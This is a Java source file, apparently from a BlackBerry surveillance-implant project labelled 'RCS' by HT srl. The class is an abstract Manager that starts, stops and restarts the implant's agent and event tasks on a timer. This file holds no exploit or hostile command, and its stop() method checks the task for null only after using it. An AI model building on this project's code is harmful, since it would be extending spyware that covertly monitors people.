/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib 
 * File         : Manager.java 
 * Created      : 26-mar-2010
 * *************************************************/

package com.ht.rcs.blackberry;

import java.util.Vector;
import java.util.Timer;

import com.ht.rcs.blackberry.agent.Agent;
import com.ht.rcs.blackberry.event.Event;
import com.ht.rcs.blackberry.threadpool.TimerJob;
import com.ht.rcs.blackberry.utils.Check;
import com.ht.rcs.blackberry.utils.Debug;
import com.ht.rcs.blackberry.utils.DebugLevel;
import com.ht.rcs.blackberry.utils.Utils;

/**
 * The Class Manager. Classe astratta che racchiude le funzionalita' di Manager,
 * utili a - far partire un servizio identificato da un id - far partire tutti i
 * servizi registrati - fermare un servizio identificato da un id - fermare
 * tutti i servizi - far fermare e far ripartire un servizio specifico
 */
public abstract class Manager {

    //#debug
    private static Debug debug = new Debug("Manager", DebugLevel.VERBOSE);

    /** The status obj. */
    public Status statusObj = null;

    /**
     * Instantiates a new manager.
     */
    protected Manager() {
        statusObj = Status.getInstance();
    }

    public final boolean isEnabled(int id) {
        TimerJob thread = getItem(id);
        return thread.isEnabled();
    }

    public final void enable(int id) {
        TimerJob thread = getItem(id);
        thread.enable(true);
    }

    /*
     * public final boolean isRunning(int id) { return getItem(id).isRunning();
     * }
     */

    public abstract TimerJob getItem(int id);

    public abstract Vector getAllItems();

    private Timer timer = new Timer();

    /**
     * Re start.
     * 
     * @param id
     *            the id
     * @return true, if successful
     */
    public boolean reStart(int id) {
        //#ifdef DBC
        Check.requires(timer != null, "Timer null");
        //#endif

        // #debug
        debug.trace("restart " + id);
        boolean ret = true;

        TimerJob task = getItem(id);

        if (task == null) {
            // #debug
            debug.error("Thread unknown: " + id);
            return false;
        }

        if (task.isEnabled() && task.isScheduled()) {
            task.restart();
        } else {
            // #mdebug
            debug.warn("cannot restart: " + id + " enabled:" + task.isEnabled()
                    + " scheduled:" + task.isScheduled());
            // #enddebug
        }
        return ret;
    }

    /**
     * Start.
     * 
     * @param id
     *            the id
     * @return true, if successful
     */
    public final synchronized boolean start(int id) {

        //#ifdef DBC
        Check.requires(timer != null, "Timer null");
        //#endif

        TimerJob task = getItem(id);
        if (task == null) {
            // #debug
            debug.error("Thread unknown: " + id);
            return false;
        }

        if (!task.isEnabled()) {
            // #debug
            debug.error("Not enabled [0] " + id);
            return false;
        }

        if (task.isScheduled()) {
            // #debug
            debug.info("Already scheduled" + id);
            return true;
        }

        task.addToTimer(timer);

        // #debug
        debug.trace("Start() OK");
        return true;
    }

    /**
     * Start all.
     * 
     * 
     * @return true, if successful
     */
    public final synchronized boolean startAll() {
        Vector tasks = getAllItems();
        int tsize = tasks.size();

        timer = new Timer();

        //#mdebug
        for (int i = 0; i < tsize; ++i) {
            TimerJob thread = (TimerJob) tasks.elementAt(i);
            debug.trace("Thread to start: " + thread);
            thread = null;
        }
        //#enddebug

        try {
            for (int i = 0; i < tsize; ++i) {
                TimerJob task = (TimerJob) tasks.elementAt(i);

                if (task.isEnabled()) {
                    // #debug
                    debug.trace("Starting: " + task);
                    task.addToTimer(timer);

                } else {
                    // #debug
                    debug.trace("Not starting because disabled: " + task);
                }

                //Utils.sleep(100);
            }
        } catch (Exception ex) {
            debug.error(ex.toString());
        }

        // #debug
        debug.trace("StartAll() OK");
        return true;
    }

    /**
     * Stop.
     * 
     * @param id
     *            the id
     * @return the int
     */
    public final synchronized boolean stop(int id) {
        //#ifdef DBC
        Check.requires(timer != null, "Timer null");
        //#endif

        TimerJob task = getItem(id);

        if (task.isScheduled()) {
            if (task != null) {
                task.stop();
            }
        }

        return true;
    }

    /**
     * Stop all.
     * 
     * @return the int
     */
    public final synchronized boolean stopAll() {
        Vector tasks = getAllItems();
        int tsize = tasks.size();

        timer.cancel();
        for (int i = 0; i < tsize; ++i) {
            TimerJob task = (TimerJob) tasks.elementAt(i);
            task.stop();
        }
        
        timer = null;
        return true;
    }
}
